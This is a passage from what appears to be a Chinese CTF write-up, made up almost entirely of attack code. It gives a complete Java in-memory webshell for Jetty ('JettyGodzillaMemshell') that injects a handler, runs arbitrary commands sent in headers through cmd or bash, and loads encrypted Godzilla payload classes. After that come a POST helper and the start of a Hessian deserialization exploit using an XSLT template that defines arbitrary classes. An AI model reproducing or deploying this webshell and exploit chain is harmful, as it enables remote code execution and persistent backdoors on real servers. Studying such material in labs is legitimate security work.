javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.ref.Reference;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">//author:Boogipop</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JettyGodzillaMemshell</span> <span class="keyword">extends</span> <span class="title class_">AbstractHandler</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; <span class="comment">// key</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;username&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5(pass + xc);</span><br><span class="line">    Class payload;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.security.MessageDigest m;</span><br><span class="line">            m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">            ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JettyGodzillaMemshell</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JettyGodzillaMemshell</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HttpConnection</span> <span class="variable">valueField</span> <span class="operator">=</span> getValueField();</span><br><span class="line">            <span class="type">HandlerCollection</span> <span class="variable">handler</span> <span class="operator">=</span> (HandlerCollection) valueField.getHttpChannel().getServer().getHandler();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">mutableWhenRunning</span> <span class="operator">=</span> handler.getClass().getDeclaredField(<span class="string">&quot;_mutableWhenRunning&quot;</span>);</span><br><span class="line">            mutableWhenRunning.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            mutableWhenRunning.set(handler,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            handler.addHandler(new JettyHandlerMemshell(1));</span></span><br><span class="line">            Handler[] handlers = handler.getHandlers();</span><br><span class="line">            Handler[] newHandlers=<span class="keyword">new</span> <span class="title class_">Handler</span>[handlers.length+<span class="number">1</span>];</span><br><span class="line">            newHandlers[<span class="number">0</span>]=<span class="keyword">new</span> <span class="title class_">JettyGodzillaMemshell</span>(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; handlers.length; i++) &#123;</span><br><span class="line">                newHandlers[i + <span class="number">1</span>] = handlers[i];</span><br><span class="line">            &#125;</span><br><span class="line">            handler.setHandlers(newHandlers);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> sun.misc.Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafe</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        sun.misc.<span class="type">Unsafe</span> <span class="variable">theunsafe</span> <span class="operator">=</span> (sun.misc.Unsafe) unsafe.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> theunsafe;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HttpConnection <span class="title function_">getValueField</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, ClassNotFoundException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">        <span class="type">ThreadGroup</span> <span class="variable">threadGroup</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">threadsfiled</span> <span class="operator">=</span> threadGroup.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        Thread[] threads = (Thread[]) unsafe.getObject(threadGroup, unsafe.objectFieldOffset(threadsfiled));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;threads.length;i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">threadLocalsF</span> <span class="operator">=</span> threads[i].getClass().getDeclaredField(<span class="string">&quot;threadLocals&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">threadlocal</span> <span class="operator">=</span> unsafe.getObject(threads[i], unsafe.objectFieldOffset(threadLocalsF));</span><br><span class="line">                Reference[] table = (Reference[]) unsafe.getObject(threadlocal, unsafe.objectFieldOffset(threadlocal.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>)));</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;table.length;j++)&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//HttpConnection value = (HttpConnection) unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(&quot;value&quot;)));</span></span><br><span class="line">                        <span class="comment">//PrintWriter writer = value.getHttpChannel().getResponse().getWriter();</span></span><br><span class="line">                        <span class="comment">//writer.println(Runtime.getRuntime().exec(value.getHttpChannel().getRequest().getParameter(&quot;cmd&quot;)));</span></span><br><span class="line">                        <span class="comment">//writer.flush();</span></span><br><span class="line">                        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span>unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(<span class="string">&quot;value&quot;</span>)));</span><br><span class="line">                        <span class="keyword">if</span>(value.getClass().getName().equals(<span class="string">&quot;org.eclipse.jetty.server.HttpConnection&quot;</span>))&#123;</span><br><span class="line">                            <span class="keyword">return</span> (HttpConnection)value;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class base64;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">            value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">                value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class base64;</span><br><span class="line">        <span class="type">byte</span>[] value = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">            value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">                value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(String s, Request base, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getHeader(<span class="string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="string">&quot;cmd&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">                    String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    base.setHandled(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\ASADSADASDSADAS&quot;</span>).next();</span><br><span class="line">                    <span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">                    outputStream.write(result.getBytes());</span><br><span class="line">                    outputStream.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (request.getHeader(<span class="string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="string">&quot;godzilla&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题</span></span><br><span class="line">                <span class="type">byte</span>[] data = base64Decode(request.getParameter(pass));</span><br><span class="line">                data = x(data, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (payload == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>], Thread.currentThread().getContextClassLoader());</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">defMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">                    defMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    payload = (Class) defMethod.invoke(urlClassLoader, data, <span class="number">0</span>, data.length);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> payload.newInstance();</span><br><span class="line">                    f.equals(arrOut);</span><br><span class="line">                    f.equals(data);</span><br><span class="line">                    f.equals(request);</span><br><span class="line">                    base.setHandled(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">                    outputStream.write(md5.substring(<span class="number">0</span>, <span class="number">16</span>).getBytes());</span><br><span class="line">                    f.toString();</span><br><span class="line">                    outputStream.write(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)).getBytes());</span><br><span class="line">                    outputStream.write(md5.substring(<span class="number">16</span>).getBytes());</span><br><span class="line">                    outputStream.flush();</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>用java写一个post请求：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">sendPostRequest</span><span class="params">(String urlString, <span class="type">byte</span>[] rawData)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(urlString);</span><br><span class="line">        <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 设置请求方法为POST</span></span><br><span class="line">            connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">            <span class="comment">// 允许输入输出</span></span><br><span class="line">            connection.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 设置请求头</span></span><br><span class="line">            connection.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>);  <span class="comment">// 根据需要设置Content-Type</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 写入请求体</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> connection.getOutputStream()) &#123;</span><br><span class="line">                os.write(rawData);</span><br><span class="line">                os.flush();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取响应</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> connection.getInputStream()) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> bytesRead;</span><br><span class="line">                <span class="keyword">while</span> ((bytesRead = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    response.append(<span class="keyword">new</span> <span class="title class_">String</span>(buffer, <span class="number">0</span>, bytesRead, <span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> response.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            connection.disconnect();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>最后往<code>/run</code>post就行了</p>
<p>附一张根本打不开靶机的截图.jpg</p>
<img src="/posts/52077/4.png" class title="awa">
<p>payload如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Err0r233;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.MimeTypeParameterList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">sendPostRequest</span><span class="params">(String urlString, <span class="type">byte</span>[] rawData)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(urlString);</span><br><span class="line">        <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 设置请求方法为POST</span></span><br><span class="line">            connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">            <span class="comment">// 允许输入输出</span></span><br><span class="line">            connection.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 设置请求头</span></span><br><span class="line">            connection.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>);  <span class="comment">// 根据需要设置Content-Type</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 写入请求体</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> connection.getOutputStream()) &#123;</span><br><span class="line">                os.write(rawData);</span><br><span class="line">                os.flush();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取响应</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> connection.getInputStream()) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> bytesRead;</span><br><span class="line">                <span class="keyword">while</span> ((bytesRead = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    response.append(<span class="keyword">new</span> <span class="title class_">String</span>(buffer, <span class="number">0</span>, bytesRead, <span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> response.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            connection.disconnect();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">step1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xsltTemplate</span> <span class="operator">=</span> <span class="string">&quot;&lt;xsl:stylesheet version=\&quot;1.0\&quot; xmlns:xsl=\&quot;http://www.w3.org/1999/XSL/Transform\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:b64=\&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:ob=\&quot;http://xml.apache.org/xalan/java/java.lang.Object\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:th=\&quot;http://xml.apache.org/xalan/java/java.lang.Thread\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                xmlns:ru=\&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;xsl:template match=\&quot;/\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:variable name=\&quot;bs\&quot; select=\&quot;b64:decodeBuffer(b64:new(),&#x27;base64&#x27;)\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:variable name=\&quot;cl\&quot; select=\&quot;th:getContextClassLoader(th:currentThread())\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:variable name=\&quot;rce\&quot; select=\&quot;ru:defineClass(&#x27;classname&#x27;,$bs,$cl)\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;xsl:value-of select=\&quot;$rce\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/xsl:template&gt;\n&quot;</span> +</span><br><span class="line">                <span 